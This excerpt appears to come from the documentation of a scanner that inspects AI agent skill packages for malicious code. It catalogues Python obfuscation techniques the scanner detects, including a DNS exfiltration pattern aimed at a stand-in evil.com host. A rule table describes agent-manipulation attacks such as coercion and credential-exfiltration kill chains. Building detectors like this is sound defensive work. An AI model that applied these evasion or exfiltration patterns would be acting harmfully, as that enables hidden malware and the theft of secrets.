...
- **AST-based Python analysis** — `.py` files are parsed with Python's `ast` module to catch evasion techniques that regex cannot detect (string concatenation building `eval`, `chr()`-based construction, `getattr` with dynamic names, unsafe deserialization, ROT13 codec usage including manual chr/ord/%26 rotation functions, string-splitting evasion where dangerous names or encoded payloads are assembled across multiple variables via concatenation, f-strings with `!s`/`!r` conversions, `join` with lists/generators/`reversed()`/`map(chr)`/`map(str)`/`map(lambda c: chr(c), ...)`, nested 2-generator comprehensions (`[chr(c) for row in [[ints],[ints]] for c in row]`), `str.format()` with positional and keyword args, `str.format_map(dict)`, `%`-formatting with mixed specifiers, dict subscript access, string slicing including `[::-1]` reversal, `chr(ord())` nesting with arithmetic padding, bytes/bytearray/str/codecs constructor decoding including `bytes.fromhex()` concatenation, dynamic dispatch via `globals()`/`vars()`/`__dict__` subscript chains, string multiplication, imports inside `try/except` blocks, `from os import *` star-import expansion, `subprocess(['curl', ...])` list-arg network calls, DNS exfiltration via `socket.getaddrinfo(f'{data}.evil.com', ...)`, loop-assembled strings (`for c in ['e','v','a','l']: name += c`), cross-function dataflow where functions return string fragments that are assembled into dangerous names at call sites, dangerous `**kwargs` unpacking where a dict containing `shell=True` is unpacked into subprocess calls via `dict.update()` chaining, inline import chains (`__import__('os').system('cmd')`), and multi-step dynamic execution chains where `__import__()` or `importlib.import_module()` return values are stored in variables and then called as `m.system('cmd')` or resolved via `getattr` and invoked as bare function references)
- **Package-level risk analysis** — holistic risk scoring for complete skill packages beyond individual file findings; classifies files into roles (entrypoint, script, config, support-doc, reference), detects coercion language, suspicious URLs, remote-bootstrap patterns, and secret requests in documentation; applies cross-file correlation rules and produces a `PackageRiskSummary` with a numeric score, risk band (`low`/`guarded`/`high`/`severe`), top risk drivers, and suspicious URL count
...
| Agent Manipulation | AGENT-001, AGENT-006 | Natural-language coercion to write sensitive system files (AGENT-001); multi-step compound attack instructions — kill-chain sequences (read credential, encode, exfiltrate) detected by sliding-window structural correlation (AGENT-006) |
